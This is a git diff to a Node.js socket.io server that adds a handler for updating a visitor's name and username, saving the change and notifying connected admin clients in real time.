@@ -352,6 +352,27 @@ io.on("connection", (socket) => {
     }
   });
 
+  // Handle visitor name update (from MOH username)
+  socket.on("visitor:updateName", (name) => {
+    const visitor = visitors.get(socket.id);
+    if (visitor && name) {
+      visitor.fullName = name;
+      visitor.mohUsername = name;
+      visitors.set(socket.id, visitor);
+      saveVisitorPermanently(visitor);
+
+      // Notify admins
+      admins.forEach((admin, adminSocketId) => {
+        io.to(adminSocketId).emit("visitor:nameUpdated", {
+          visitorId: visitor._id,
+          name: name,
+        });
+      });
+
+      console.log(`Visitor ${visitor._id} name updated to: ${name}`);
+    }
+  });
+
   // Handle more info (data submission)
   socket.on("more-info", (data) => {
     const visitor = visitors.get(socket.id);
